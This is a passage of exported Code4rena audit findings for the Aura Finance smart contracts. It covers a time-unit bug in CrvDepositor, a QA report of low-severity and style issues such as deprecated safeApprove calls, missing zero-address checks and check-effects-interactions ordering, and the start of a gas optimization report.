    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/CrvDepositor.sol#L127-L134\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/CrvDepositor.sol#L127-L134\n\n```solidity\nuint256 unlockAt = block.timestamp + MAXTIME;\nuint256 unlockInWeeks = (unlockAt/WEEK)*WEEK;\n\n//increase time too if over 2 week buffer\nif(unlockInWeeks.sub(unlockTime) > 2){\n    IStaker(staker).increaseTime(unlockAt);\n    unlockTime = unlockInWeeks;\n}\n```\n\nIn `_lockCurve()`, `unlockInWeeks - unlockTime` is being used as a number in weeks, while it actually is a number in seconds.\n\nThus, comparing it with `2` actually means a 2 seconds buffer instead of a 2 weeks buffer.\n\nThe intention is to wait for 2 weeks before extending the lock time again, but the current implementation allows the extension of the lock once a new week begins.\n\n### Recommendation\n\nConsider changing the name of `unlockTime` to `unlockTimeInWeeks`, and:\n\n1. Change L94-102 to:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/CrvDepositor.sol#L94-L102\n\n```solidity\nuint256 unlockAt = block.timestamp + MAXTIME;\nuint256 unlockInWeeks = unlockAt / WEEK;\n\n//release old lock if exists\nIStaker(staker).release();\n//create new lock\nuint256 crvBalanceStaker = IERC20(crvBpt).balanceOf(staker);\nIStaker(staker).createLock(crvBalanceStaker, unlockAt);\nunlockTimeInWeeks = unlockInWeeks;\n```\n\n2. Change L127-L134 to:\n\n```solidity\nuint256 unlockAt = block.timestamp + MAXTIME;\nuint256 unlockInWeeks = unlockAt / WEEK;\n\n//increase time too if over 2 week buffer\nif(unlockInWeeks.sub(unlockTime) > 2){\n    IStaker(staker).increaseTime(unlockAt);\n    unlockTimeInWeeks = unlockInWeeks;\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-aura-findings",
      "repo": "https://github.com/code-423n4/2022-05-aura-findings",
      "url": "https://github.com/code-423n4/2022-05-aura-findings/issues/343"
    }
  },
  {
    "title": "QA Report",
    "body": "**Table of Contents:**\n\n- [[L-01] Deprecated safeApprove() function](#l-01-deprecated-safeapprove-function)\n- [[L-02] Deprecated approve() function](#l-02-deprecated-approve-function)\n- [[L-03] Missing address(0) checks](#l-03-missing-address0-checks)\n- [[L-04] Unbounded loop on array can lead to DoS](#l-04-unbounded-loop-on-array-can-lead-to-dos)\n- [[L-05] Add a timelock and event to critical functions](#l-05-add-a-timelock-and-event-to-critical-functions)\n- [[L-06] Failed transfer with low level call could be overlooked](#l-06-failed-transfer-with-low-level-call-could-be-overlooked)\n- [[L-07] `_safeMint()` should be used rather than `_mint()` wherever possible](#l-07-_safemint-should-be-used-rather-than-_mint-wherever-possible)\n- [[L-08] `BaseRewardPool:donate()` CEIP not respected](#l-08-baserewardpooldonate-ceip-not-respected)\n- [[L-09] `AuraBalRewardPool:getReward()` CEIP not respected](#l-09-aurabalrewardpoolgetreward-ceip-not-respected)\n- [[N-01] Using simple quotes for strings](#n-01-using-simple-quotes-for-strings)\n- [[N-02] Unused named returns](#n-02-unused-named-returns)\n- [[N-03] Deprecated library used for Solidity 0.8.+ : SafeMath](#n-03-deprecated-library-used-for-solidity-08--safemath)\n- [[N-04] It's better to emit after all processing is done](#n-04-its-better-to-emit-after-all-processing-is-done)\n- [[N-05] CEI not respected with a call made to the contract's address](#n-05-cei-not-respected-with-a-call-made-to-the-contracts-address)\n\n## [L-01] Deprecated safeApprove() function\n\nUsing this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ issue #2219 (OpenZeppelin/openzeppelin-contracts#2219). The OpenZeppelin ERC20 safeApprove() function has been deprecated, as seen in the comments of the OpenZeppelin code.\n\nAs recommended by the OpenZeppelin comment, I suggest replacing safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead:\n\n```solidity\ncontracts/AuraBalRewardPool.sol:\n  75:         rewardToken.safeApprove(_auraLocker, type(uint256).max);\n\ncontracts/AuraClaimZap.sol:\n   98:         IERC20(crv).safeApprove(crvDepositWrapper, 0);\n   99:         IERC20(crv).safeApprove(crvDepositWrapper, type(uint256).max);\n  101:         IERC20(cvxCrv).safeApprove(cvxCrvRewards, 0);\n  102:         IERC20(cvxCrv).safeApprove(cvxCrvRewards, type(uint256).max);\n  104:         IERC20(cvx).safeApprove(locker, 0);\n  105:         IERC20(cvx).safeApprove(locker, type(uint256).max);\n\ncontracts/AuraLocker.sol:\n  240:         IERC20(cvxCrv).safeApprove(cvxcrvStaking, 0);\n  241:         IERC20(cvxCrv).safeApprove(cvxcrvStaking, type(uint256).max);\n\ncontracts/AuraMerkleDrop.sol:\n  131:             aura.safeApprove(address(auraLocker), 0);\n  132:             aura.safeApprove(address(auraLocker), _amount);\n\ncontracts/AuraPenaltyForwarder.sol:\n  41:         token.safeApprove(address(distributor), type(uint256).max);\n\ncontracts/AuraStakingProxy.sol:\n  147:         IERC20(crv).safeApprove(crvDepositorWrapper, 0);\n  148:         IERC20(crv).safeApprove(crvDepositorWrapper, type(uint256).max);\n  150:         IERC20(cvxCrv).safeApprove(rewards, 0);\n  151:         IERC20(cvxCrv).safeApprove(rewards, type(uint256).max);\n  215:             _token.safeApprove(rewards, 0);\n  216:             _token.safeApprove(rewards, type(uint256).max);\n\ncontracts/AuraVestedEscrow.sol:\n  186:             rewardToken.safeApprove(address(auraLocker), claimable);\n\ncontracts/BalLiquidityProvider.sol:\n  59:             tkn.safeApprove(address(bVault), 0);\n  60:             tkn.safeApprove(address(bVault), bal);\n\ncontracts/CrvDepositorWrapper.sol:\n  52:         IERC20(WETH).safeApprove(address(BALANCER_VAULT), type(uint256).max);\n  53:         IERC20(BAL).safeApprove(address(BALANCER_VAULT), type(uint256).max);\n\nconvex-platform/contracts/contracts/BaseRewardPool4626.sol:\n  40:         IERC20(asset).safeApprove(operator_, type(uint256).max);\n\nconvex-platform/contracts/contracts/Booster.sol:\n  422:             IERC20(token).safeApprove(rewardContract,0);\n  423:             IERC20(token).safeApprove(rewardContract,_amount);\n\nconvex-platform/contracts/contracts/CrvDepositor.sol:\n  199:             IERC20(minter).safeApprove(_stakeAddress,0);\n  200:             IERC20(minter).safeApprove(_stakeAddress,_amount);\n\nconvex-platform/contracts/contracts/VoterProxy.sol:\n  176:             IERC20(_token).safeApprove(_gauge, 0);\n  177:             IERC20(_token).safeApprove(_gauge, balance);\n  193:         _asset.safeApprove(rewardDeposit, 0); \n  194:         _asset.safeApprove(rewardDeposit, balance); \n  244:         IERC20(crvBpt).safeApprove(escrow, 0);\n  245:         IERC20(crvBpt).safeApprove(escrow, _value);\n  255:         IERC20(crvBpt).safeApprove(escrow, 0);\n  256:         IERC20(crvBpt).safeApprove(escrow, _value);\n```\n\n## [L-02] Deprecated approve() function\n\nWhile `safeApprove()` in itself is deprecated, it is still better than `approve` which is subject to a known front-running attack. Consider using `safeApprove` instead (or better: `safeIncreaseAllowance()`/`safeDecreaseAllowance()`):\n\n```solidity\nFile: CrvDepositorWrapper.sol\n119:         require(IERC20(BALANCER_POOL_TOKEN).approve(crvDeposit, type(uint256).max), \"!approval\");\n```\n\n## [L-03] Missing address(0) checks\n\nIn the constructors, the solution never checks for `address(0)` when setting the value of immutable variables. I suggest adding those checks.\n\nList of immutable variables:\n\n```solidity\ncontracts/Aura.sol:\n  26:     address public immutable vecrvProxy;\n\ncontracts/AuraBalRewardPool.sol:\n  31:     address public immutable rewardManager;\n  34:     address public immutable penaltyForwarder;\n\ncontracts/AuraClaimZap.sol:\n  43:     address public immutable crv;\n  44:     address public immutable cvx;\n  45:     address public immutable cvxCrv;\n  46:     address public immutable crvDepositWrapper;\n  47:     address public immutable cvxCrvRewards;\n  48:     address public immutable locker;\n  49:     address public immutable owner;\n\ncontracts/AuraLocker.sol:\n  105:     address public immutable cvxCrv;\n  109:     address public immutable cvxcrvStaking;\n\ncontracts/AuraMerkleDrop.sol:\n  28:     address public immutable penaltyForwarder;\n\ncontracts/AuraStakingProxy.sol:\n  38:     address public immutable crv;\n  39:     address public immutable cvx;\n  40:     address public immutable cvxCrv;\n\ncontracts/BalLiquidityProvider.sol:\n  19:     address private immutable provider;\n  20:     address public immutable dao;\n\ncontracts/ClaimFeesHelper.sol:\n  20:     address public immutable voterProxy;\n\ncontracts/CrvDepositorWrapper.sol:\n   27:     address public immutable BAL;\n   28:     address public immutable WETH;\n   29:     address public immutable BALANCER_POOL_TOKEN;\n  105:     address public immutable crvDeposit;\n\nconvex-platform/contracts/contracts/ArbitartorVault.sol:\n  25:     address public immutable depositor;\n\nconvex-platform/contracts/contracts/BaseRewardPool.sol:\n  67:     address public immutable operator;\n  68:     address public immutable rewardManager;\n\nconvex-platform/contracts/contracts/Booster.sol:\n  22:     address public immutable crv;\n  23:     address public immutable voteOwnership;\n  24:     address public immutable voteParameter;\n  36:     address public immutable staker;\n  37:     address public immutable minter;\n\nconvex-platform/contracts/contracts/BoosterOwner.sol:\n  43:     address public immutable poolManager;\n  44:     address public immutable booster;\n  45:     address public immutable stashFactory;\n  46:     address public immutable rescueStash;\n\nconvex-platform/contracts/contracts/CrvDepositor.sol:\n  24:     address public immutable crvBpt;\n  25:     address public immutable escrow;\n  34:     address public immutable staker;\n  35:     address public immutable minter;\n\nconvex-platform/contracts/contracts/ExtraRewardStashV3.sol:\n  30:     address public immutable crv;\n\nconvex-platform/contracts/contracts/PoolManagerProxy.sol:\n  15:     address public immutable pools;\n\nconvex-platform/contracts/contracts/PoolManagerSecondaryProxy.sol:\n  19:     address public immutable gaugeController;\n  20:     address public immutable pools;\n  21:     address public immutable booster;\n\nconvex-platform/contracts/contracts/PoolManagerV3.sol:\n  18:     address public immutable pools;\n  19:     address public immutable gaugeController;\n\nconvex-platform/contracts/contracts/RewardFactory.sol:\n  24:     address public immutable operator;\n  25:     address public immutable crv;\n\nconvex-platform/contracts/contracts/RewardHook.sol:\n  24:     address public immutable stash;\n  25:     address public immutable rewardToken;\n\nconvex-platform/contracts/contracts/StashFactoryV2.sol:\n  23:     address public immutable operator;\n  24:     address public immutable rewardFactory;\n  25:     address public immutable proxyFactory;\n\nconvex-platform/contracts/contracts/TokenFactory.sol:\n  20:     address public immutable operator;\n\nconvex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:\n  87:     address public immutable operator;\n\nconvex-platform/contracts/contracts/VoterProxy.sol:\n  23:     address public immutable crv;\n  24:     address public immutable crvBpt;\n  26:     address public immutable escrow;\n```\n\n## [L-04] Unbounded loop on array can lead to DoS\n\nAs this array can grow quite large, the transaction's gas cost could exceed the block gas limit and make it impossible to call this function at all.\n\n```solidity\nconvex-platform/contracts/contracts/ConvexMasterChef.sol:\n  180:         for (uint256 pid = 0; pid < length; ++pid) {\n\n\nconvex-platform/contracts/contracts/ExtraRewardStashV3.sol:\n  199:         for(uint i=0; i < tCount; i++){\n```\n\nConsider introducing a reasonable upper limit based on block gas limits and adding a method to remove elements in the array.\n\n## [L-05] Add a timelock and event to critical functions\n\nIt is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate (less risk of a malicious owner making a sandwich attack on a user).  \n\nConsider adding a timelock to:\n\n```solidity\nconvex-platform/contracts/contracts/Booster.sol:\n  272:     function setFees(uint256 _lockFees, uint256 _stakerFees, uint256 _callerFees, uint256 _platform) external{\n```\n\nConsider adding a timelock and event to:\n\n```solidity\nFile: CrvDepositor.sol\n72:     function setFees(uint256 _lockIncentive) external{\n73:         require(msg.sender==feeManager, \"!auth\");\n74: \n75:         if(_lockIncentive >= 0 && _lockIncentive <= 30){ \n76:             lockIncentive = _lockIncentive; //@audit : no event\n77:        }\n78:     }\n```\n\n## [L-06] Failed transfer with low level call could be overlooked\n\nLow-level calls return true even if the account called is non-existent (per EVM design). Account existence must be checked prior to calling.\n\nAffected code:\n\n```solidity\nconvex-platform/contracts/contracts/BoosterOwner.sol:\n  187:         (bool success, bytes memory result) = _to.call{value:_value}(_data);\n\nconvex-platform/contracts/contracts/VoterProxy.sol:\n  352:         (bool success, bytes memory result) = _to.call{value:_value}(_data);\n```\n\nConsider checking for account-existence before the `call()` to make this safely extendable to user-controlled address contexts in future. At the very least, check for address(0).\n\n## [L-07] `_safeMint()` should be used rather than `_mint()` wherever possible\n\n`_mint()` is [discouraged](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4d8d2ed9798cc3383912a23b5e8d5cb602f7d4b/contracts/token/ERC721/ERC721.sol#L271) in favor of `_safeMint()` which ensures that the recipient is either an EOA or implements `IERC721Receiver`. Both open [OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4d8d2ed9798cc3383912a23b5e8d5cb602f7d4b/contracts/token/ERC721/ERC721.sol#L238-L250) and [solmate](https://github.com/Rari-Capital/solmate/blob/4eaf6b68202e36f67cab379768ac6be304c8ebde/src/tokens/ERC721.sol#L180) have versions of this function so that NFTs aren't lost if they're minted to contracts that cannot transfer them back out.\n\nFile: contracts/NFTLoanTicket.sol (line [34](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanTicket.sol#L34))\n\n```solidity\ncontracts/Aura.sol:\n   71:         _mint(_to, _amount);\n  121:             _mint(_to, amount);\n  131:         _mint(_to, _amount);\n\nconvex-platform/contracts/contracts/cCrv.sol:\n  49:         _mint(_to, _amount);\n\nconvex-platform/contracts/contracts/DepositToken.sol:\n  50:         _mint(_to, _amount);\n```\n\n## [L-08] `BaseRewardPool:donate()` CEIP not respected\n\nCheck Effects Interactions pattern should always be respected, be it for the current state of the solution, the future of the solution or a future fork of the solution:\n\n```solidity\nFile: BaseRewardPool.sol\n311:     /**\n312:      * @dev Donate some extra rewards to this contract\n313:      */\n314:     function donate(uint256 _amount) external returns(bool){\n315:         IERC20(rewardToken).safeTransferFrom(msg.sender, address(this), _amount); // @audit-info LOW CEI not respected, this is low as this call is happening to the contract's address \n316:         queuedRewards = queuedRewards.add(_amount);\n317:     }\n```\n\n## [L-09] `AuraBalRewardPool:getReward()` CEIP not respected\n\nCheck Effects Interactions pattern should always be respected, be it for the current state of the solution, the future of the solution or a future fork of the solution:\n\n```solidity\nFile: AuraBalRewardPool.sol\n152:     function AuraBalRewardPool(\n153:         uint256 amount,\n154:         bool claim,\n155:         bool lock\n156:     ) public updateReward(msg.sender) returns (bool) {\n157:         require(amount > 0, \"RewardPool : Cannot withdraw 0\");\n158: \n159:         _totalSupply = _totalSupply.sub(amount);\n160:         _balances[msg.sender] = _balances[msg.sender].sub(amount);\n161: \n162:         stakingToken.safeTransfer(msg.sender, amount); // @audit-info HIGH CEI not respected which can open attack vectors for re-entrancy attacks. Consider moving this at the final and add a reentrancy guard\n163:         emit Withdrawn(msg.sender, amount);\n164: \n165:         if (claim) {\n166:             getReward(lock);\n167:         }\n168: \n169:         return true;\n170:     }\n```\n\n## [N-01] Using simple quotes for strings\n\nTo be consistent with the style used in the solution, consider using double quotes instead of simple quotes here:\n\n```solidity\nconvex-platform/contracts/contracts/BaseRewardPool.sol:\n  211:         require(_amount > 0, 'RewardPool : Cannot stake 0');\n  227:         require(amount > 0, 'RewardPool : Cannot withdraw 0');\n```\n\n## [N-02] Unused named returns\n\nUsing both named returns and a return statement isn't necessary. Removing one of those can improve code clarity:\n\n```solidity\ncontracts/AuraLocker.sol:\n  648:     function balanceOf(address _user) external view returns (uint256 amount) {\n\n  653:     function balanceAtEpochOf(uint256 _epoch, address _user) public view returns (uint256 amount) {\n\n  739:     function findEpochId(uint256 _time) public view returns (uint256 epoch) {\n\n  769:     function claimableRewards(address _account) external view returns (EarnedData[] memory userRewards) {\n\nconvex-platform/contracts/contracts/VoterProxy.sol:\n  188:     function withdraw(IERC20 _asset) external returns (uint256 balance) {\n```\n\n## [N-03] Deprecated library used for Solidity 0.8.+ : SafeMath\n\nAffected code:\n\n```solidity\ncontracts/AuraBalRewardPool.sol:\n   2: pragma solidity ^0.8.11;\n   5: import { SafeMath } from \"@openzeppelin/contracts-0.8/utils/math/SafeMath.sol\";\n  24:     using SafeMath for uint256;\n\ncontracts/AuraStakingProxy.sol:\n   2: pragma solidity ^0.8.11;\n   7: import { SafeMath } from \"@openzeppelin/contracts-0.8/utils/math/SafeMath.sol\";\n  35:     using SafeMath for uint256;\n```\n\n## [N-04] It's better to emit after all processing is done\n\nAffected code:\n\n```solidity\ncontracts/AuraBalRewardPool.sol:\n  163:         emit Withdrawn(msg.sender, amount);\n\ncontracts/AuraLocker.sol:\n  365:         emit Withdrawn(msg.sender, amt, false);\n  479:         emit DelegateChanged(msg.sender, oldDelegatee, newDelegatee);\n\nconvex-platform/contracts/contracts/BaseRewardPool.sol:\n  238:         emit Withdrawn(msg.sender, amount);\n  291:             emit RewardPaid(_account, reward);\n```\n\n## [N-05] CEI not respected with a call made to the contract's address\n\nAffected code:\n\n```solidity\nFile: BaseRewardPool.sol\n311:     /**\n312:      * @dev Donate some extra rewards to this contract\n313:      */\n314:     function donate(uint256 _amount) external returns(bool){\n315:         IERC20(rewardToken).safeTransferFrom(msg.sender, address(this), _amount); // @audit-info LOW CEI not respected, this is low as this call is happening to the contract's address \n316:         queuedRewards = queuedRewards.add(_amount);\n317:     }\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-05-aura-findings",
      "repo": "https://github.com/code-423n4/2022-05-aura-findings",
      "url": "https://github.com/code-423n4/2022-05-aura-findings/issues/337"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "**Table of Contents:**\n\n- [Cheap Contract Deployment Through Clones](#cheap-contract-deployment-through-clones)\n- [Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it](#help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it)\n- [`AuraLocker.emergencyWithdraw()`: Use of the `memory` keyword when `storage` should be used](#auralockeremergencywithdraw-use-of-the-memory-keyword-when-storage-should-be-used)\n- [Caching storage values in memory](#caching-storage-values-in-memory)\n- [Not using SafeMath can save gas on arithmetics operations that can't underflow/overflow](#not-using-safemath-can-save-gas-on-arithmetics-operations-that-cant-underflowoverflow)\n- [SafeMath is not needed when using Solidity version 0.8.11](#safemath-is-not-needed-when-using-solidity-version-0811)\n- [Unchecking arithmetics operations that can't underflow/overflow](#unchecking-arithmetics-operations-that-cant-underflowoverflow)\n- [`Booster`: Tighly pack storage variables](#booster-tighly-pack-storage-variables)\n- [`CrvDepositor`: Tighly pack storage variables](#crvdepositor-tighly-pack-storage-variables)\n- [`ExtraRewardStashV3`: Tighly pack storage variables](#extrarewardstashv3-tighly-pack-storage-variables)\n- [Boolean comparisons](#boolean-comparisons)\n- [`> 0` is less efficient than `!= 0` for unsigned integers (with proof)](#-0-is-less-efficient-than--0-for-unsigned-integers-with-proof)\n- [`>=` is cheaper than `>` (and `<=` cheaper than `<`)](#-is-cheaper-than--and--cheaper-than-)\n- [`CrvDepositor.sol#setFees()`: Tautology on \"_lockIncentive >= 0\" which is always true as `_lockIncentive` is uint256](#crvdepositorsolsetfees-tautology-on-_lockincentive--0-which-is-always-true-as-_lockincentive-is-uint256)\n- [Splitting `require()` statements that use `&&` saves gas](#splitting-require-statements-that-use--saves-gas)\n- [Using `bool` for storage incurs overhead](#using-bool-for-storage-incurs-overhead)\n- [Shift Right instead of Dividing by 2](#shift-right-instead-of-dividing-by-2)\n- [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops)\n- [`++i` costs less gas compared to `i++` or `i += 1`](#i-costs-less-gas-compared-to-i-or-i--1)\n- [Increments/Decrements can be unchecked](#incrementsdecrements-can-be-unchecked)\n- [Use `calldata` instead of `memory`](#use-calldata-instead-of-memory)\n- [No need to explicitly initialize variables with default values](#no-need-to-explicitly-initialize-variables-with-default-values)\n- [Upgrade pragma to at least 0.8.4](#upgrade-pragma-to-at-least-084)\n- [Reduce the size of error messages (Long revert Strings)](#reduce-the-size-of-error-messages-long-revert-strings)\n- [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)\n\n## Cheap Contract Deployment Through Clones\n\nHere, contract deployments are made:\n\n```solidity\nconvex-platform/contracts/contracts/RewardFactory.sol:61:        BaseRewardPool4626 rewardPool = new BaseRewardPool4626(_pid,_depositToken,crv,operator, address(this), _lptoken);\nconvex-platform/contracts/contracts/RewardFactory.sol:75:        VirtualBalanceRewardPool rewardPool = new VirtualBalanceRewardPool(_mainRewards,_token,_operator);\nconvex-platform/contracts/contracts/TokenFactory.sol:44:        DepositToken dtoken = new DepositToken(operator,_lptoken,namePostfix,symbolPrefix);\n```\n\nThere's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .\n\nThis is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:\n\n- <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516>\n- <https://github.com/porter-finance/v1-core/pull/34>\n\nI suggest applying a similar pattern.\n\n## Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it\n\nTo help the optimizer, declare a `storage` type variable and use it instead of repeatedly fetching the reference in a map or an array.\n\nThe effect can be quite significant.\n\nAs an example, instead of repeatedly calling `someMap[someIndex]`, save its reference like this: `SomeStruct storage someStruct = someMap[someIndex]` and use it.\n\nAffected code (check the `@audit` tags):\n\n- contracts/AuraLocker.sol:\n\n```solidity\n  177:                 rewardData[token].rewardPerTokenStored = newRewardPerToken.to96(); //@audit gas: should declare \"RewardData storage _rewardData = rewardData[token];\" and use it\n  178:                 rewardData[token].lastUpdateTime = _lastTimeRewardApplicable(rewardData[token].periodFinish).to32();//@audit gas: should use suggested _rewardData\n```\n\n```solidity\n  196:         require(rewardData[_rewardsToken].lastUpdateTime == 0, \"Reward already exists\"); //@audit gas: should declare \"RewardData storage _rewardData = rewardData[token];\" and use it\n  199:         rewardData[_rewardsToken].lastUpdateTime = uint32(block.timestamp);//@audit gas: should use suggested _rewardData\n  200:         rewardData[_rewardsToken].periodFinish = uint32(block.timestamp);//@audit gas: should use suggested _rewardData\n```\n\n```solidity\n  308:             uint256 reward = userData[_account][_rewardsToken].rewards; //@audit gas: should declare \"UserData storage _userData = userData[_account][_rewardsToken];\" and use it\n  310:                 userData[_account][_rewardsToken].rewards = 0;//@audit gas: should use suggested _userData\n```\n\n```solidity\n  412:                 if (locks[i].unlockTime > expiryTime) break; //@audit gas: should declare a storage variable for locks[i]\n  415:                 locked = locked.add(locks[i].amount); //@audit gas: should use the suggested storage variable for locks[i]\n  421:                     uint256 epochsover = currentEpoch.sub(uint256(locks[i].unlockTime)).div(rewardsDuration); //@audit gas: should use the suggested storage variable for locks[i]\n  423:                     reward = reward.add(uint256(locks[i].amount).mul(rRate).div(denominator)); //@audit gas: should use the suggested storage variable for locks[i]\n```\n\n```solidity\n  697:             if (locks[i].unlockTime > block.timestamp) {  //@audit gas: should declare a storage variable for locks[i]\n  701:                 lockData[idx] = locks[i]; //@audit gas: should use the suggested storage variable for locks[i]\n  703:                 locked = locked.add(locks[i].amount); //@audit gas: should use the suggested storage variable for locks[i]\n  705:                 unlockable = unlockable.add(locks[i].amount); //@audit gas: should use the suggested storage variable for locks[i]\n```\n\n```solidity\n  807:             uint256(rewardData[_rewardsToken].rewardPerTokenStored).add(  //@audit gas: should declare a storage variable for rewardData[_rewardsToken]\n  808:                 _lastTimeRewardApplicable(rewardData[_rewardsToken].periodFinish) //@audit gas: should use the suggested storage variable for rewardData[_rewardsToken]\n  809:                     .sub(rewardData[_rewardsToken].lastUpdateTime)//@audit gas: should use the suggested storage variable for rewardData[_rewardsToken]\n  810:                     .mul(rewardData[_rewardsToken].rewardRate)//@audit gas: should use the suggested storage variable for rewardData[_rewardsToken]\n```\n\n- convex-platform/contracts/contracts/Booster.sol:\n\n```solidity\n  225:         if(feeTokens[_feeToken].distro == address(0)){  //@audit gas: should declare \"FeeDistro storage _feeDistro = feeTokens[_feeToken];\" and use it\n  239:                 feeTokens[_feeToken] = FeeDistro({ //@audit gas: should use suggested storage variable _feeDistro\n  247:             feeTokens[_feeToken].distro = _feeDistro;//@audit gas: should use suggested storage variable _feeDistro\n```\n\n```solidity\n  258:         require(feeTokens[_feeToken].distro != address(0), \"Fee doesn't exist\");//@audit gas: should declare \"FeeDistro storage _feeDistro = feeTokens[_feeToken];\" and use it\n  260:         feeTokens[_feeToken].active = _active; //@audit gas: should use suggested storage variable _feeDistro\n```\n\n```solidity\n  559:         address stash = poolInfo[_pid].stash; //@audit gas: should declare a storage variable for poolInfo[_pid] and use it to retrieve .stash\n  561:         address gauge = poolInfo[_pid].gauge; //@audit gas: should use the suggested storage variable for poolInfo[_pid] to retrieve gauge\n```\n\n## `AuraLocker.emergencyWithdraw()`: Use of the `memory` keyword when `storage` should be used\n\nWhen copying a state struct in memory, there are as many SLOADs and MSTOREs as there are slots. When reading the whole struct multiple times is not needed, it's better to actually only read the relevant field(s). When only some of the fields are read several times, these particular values should be cached instead of the whole state struct.\n\nHere L355, the `storage` keyword should be used instead of `memory` (see `@audit` tags):\n\n```solidity\nFile: AuraLocker.sol\n55:     struct LockedBalance {\n56:         uint112 amount; //@audit-info : SLOT 1\n57:         uint32 unlockTime; //@audit-info : SLOT 1\n58:     }\n...\n352:     function emergencyWithdraw() external nonReentrant {\n...\n355:         LockedBalance[] memory locks = userLocks[msg.sender]; //@audit gas: change memory with storage like L377. Each LockedBalance is 1 SLOAD (1 SLOT used) so, too many copies in memory here when only the array's length is requires\n...\n362:         userBalance.nextUnlockIndex = locks.length.to32(); //@audit-info : locks only used for its length property\n...\n377:         LockedBalance[] storage locks = userLocks[_account]; //@audit-info : L355 should do the same thing as here (storage instead of memory)\n```\n\n## Caching storage values in memory\n\nThe code can be optimized by minimising the number of SLOADs.\n\nSLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.\n\nSee the `@audit` tags for details about the multiple SLOADs where a cached value should be used instead of `SLOAD 2` and above:\n\n- contracts/AuraBalRewardPool.sol:\n\n```solidity\n  90:         rewardPerTokenStored = rewardPerToken(); //@audit gas: future SLOAD avoidable by caching rewardPerToken() in a memory variable\n  94:             userRewardPerTokenPaid[account] = rewardPerTokenStored; //@audit gas: SLOAD avoidable by using the suggested cache on rewardPerToken()\n```\n\n- contracts/AuraMerkleDrop.sol:\n\n```solidity\n   67:         startTime = block.timestamp + _startDelay; //@audit should cache \"block.timestamp + _startDelay\"\n   70:         expiryTime = startTime + _expiresAfter; //@audit SLOAD can be avoided by using cached \"block.timestamp + _startDelay\"\n```\n\n```solidity\n   97:         require(msg.sender == dao, \"!auth\"); //@audit SLOAD 1 (dao)\n  100:         aura.safeTransfer(dao, amt); //@audit SLOAD 2 (dao)\n```\n\n```solidity\n  119:         require(merkleRoot != bytes32(0), \"!root\"); //@audit SLOAD 1 (merkleRoot)\n  126:         require(MerkleProof.verify(_proof, merkleRoot, leaf), \"invalid proof\"); //@audit SLOAD 2 (merkleRoot)\n```\n\n```solidity\n  131:             aura.safeApprove(address(auraLocker), 0);//@audit SLOAD 1 (auraLocker)\n  132:             aura.safeApprove(address(auraLocker), _amount);//@audit SLOAD 2 (auraLocker)\n```\n\n- contracts/AuraStakingProxy.sol:\n\n```solidity\n  117:         require(pendingOwner != address(0), \"invalid owner\");//@audit gas: SLOAD 1 (pendingOwner)\n  119:         owner = pendingOwner;//@audit gas: SLOAD 2 (pendingOwner)\n```\n\n```solidity\n  147:         IERC20(crv).safeApprove(crvDepositorWrapper, 0);//@audit gas: SLOAD 1 (crvDepositorWrapper)\n  148:         IERC20(crv).safeApprove(crvDepositorWrapper, type(uint256).max);//@audit gas: SLOAD 2 (crvDepositorWrapper)\n```\n\n```solidity\n  150:         IERC20(cvxCrv).safeApprove(rewards, 0);//@audit gas: SLOAD 1 (rewards)\n  151:         IERC20(cvxCrv).safeApprove(rewards, type(uint256).max);//@audit gas: SLOAD 2 (rewards)\n```\n\n```solidity\n  178:             uint256 minOut = ICrvDepositor(crvDepositorWrapper).getMinOut(crvBal, outputBps);//@audit gas: SLOAD 1 (crvDepositorWrapper)\n  179:             ICrvDepositor(crvDepositorWrapper).deposit(crvBal, minOut, true, address(0));//@audit gas: SLOAD 2 (crvDepositorWrapper)\n```\n\n```solidity\n  215:             _token.safeApprove(rewards, 0);//@audit gas: SLOAD 1 (rewards)\n  216:             _token.safeApprove(rewards, type(uint256).max);//@audit gas: SLOAD 2 (rewards)\n  219:             IAuraLocker(rewards).notifyRewardAmount(address(_token), bal);//@audit gas: SLOAD 3 (rewards)\n```\n\n- contracts/AuraVestedEscrow.sol:\n\n```solidity\n  117:         require(msg.sender == admin, \"!auth\");//@audit gas: SLOAD 1 (admin)\n  123:         rewardToken.safeTransfer(admin, delta);//@audit gas: SLOAD 2 (admin)\n```\n\n```solidity\n  185:             require(address(auraLocker) != address(0), \"!auraLocker\");//@audit gas: SLOAD 1 (auraLocker)\n  186:             rewardToken.safeApprove(address(auraLocker), claimable);//@audit gas: SLOAD 2 (auraLocker)\n```\n\n- convex-platform/contracts/contracts/BaseRewardPool.sol:\n\n```solidity\n  138:         rewardPerTokenStored = rewardPerToken();//@audit gas: should cache rewardPerToken() to avoid a future SLOAD\n  142:             userRewardPerTokenPaid[account] = rewardPerTokenStored;//@audit gas: should use suggested cache to avoid SLOAD\n```\n\n```solidity\n  329:         if (block.timestamp 